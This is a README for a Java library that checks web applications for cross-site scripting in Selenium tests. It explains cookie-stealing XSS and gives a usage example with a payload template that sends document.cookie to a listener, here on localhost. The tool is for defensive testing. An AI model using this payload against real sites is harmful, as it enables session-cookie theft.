# xssverifier
A little project for XSS-safe verification for Selenium

        <dependency>
            <groupId>com.github.eljah</groupId>
            <artifactId>xssverifier</artifactId>
            <version>0.1</version>
        </dependency>

How does the XSS and XSS sniffers work? XSS injection is a value inserted into some input text field that appears in some other pages. If in other pages where the value is displayed, the page can allow malicious javascript from the value to work. Javascript can just create an image or iframe with url on the third-party server. The URL of the resource requested by the malicious javascript will contain the value of document.cookie. If page allows maliciuos javascript to request image or iframe with URL like http://host:port//resource_prefix?document.cookie the third-party server, the sniffer, will receive the hijacked cookie value. That means that XSS attack has succeed and the attacker can use the cookie.

To prove the wep applications are XSS-free Selenium test can be used (o you can instrument your already existing test with XSS check). In the beggining of test scenario insert the injected value to some input field. Then go through all application pages that show this kind of values with Selenium. If at least at one page XSS succeed, the sniffer will receive the cookie, the XSS succeed flag will be set. In the end of the test verify that sniffer was not requested at all.

In order to do ethicial XSS testing you require simple http server running on the localhost (i.e on the same machine as browser opening the application). The Xssverifier software runs on the top of lightweight nanohttpd java http server.

##Usage example
```java
XSSCheck x=XSSVerifier.createNewCheck(4567,"xss.gif","<script> img = new Image(); img.src = \"http://%1$s:%2$d/%3$s?\"+document.cookie; </script>");
/* 4567 is a port number where the XSS checker's embbedded http server runs, xss.gif is a resource, the last string is  javascript injection template*/

//check occurs behind the scene
//to ensure it works open localhost:4567/xss.gif in your browser

while (!x.getXSSURLCalledStatus())
{
    Thread.sleep(1000);
    System.out.println("wait 1...");
}

//the XSS host and resource were requested but not nessessarily some parameter was passed
//to ensure it works open localhost:4567/xss.gif?sometext in your browser

while (!x.getXSSCookiePassedStatus())
{
    Thread.sleep(1000);
    System.out.println("wait 2...");
}

//the XSS host and resource were requested and some parameter was passed but that was not the hijacked cookie
//to ensure it works open localhost:4567/xss.gif?visited=02022015 in your browser

while (!x.getXSSCookieHijacked("visited"))
{
    Thread.sleep(1000);
    System.out.println("wait 3...");
}

//the XSS host and resource were requested, some parameter was passed and this parameter is cookie named visited
//so the particular cookie was hijacked and that was verified
```

##Notes
The xssverifier library doesn't check availability of the ports on your local machine. You should ensure that port is not already bint before creating the sniffer.
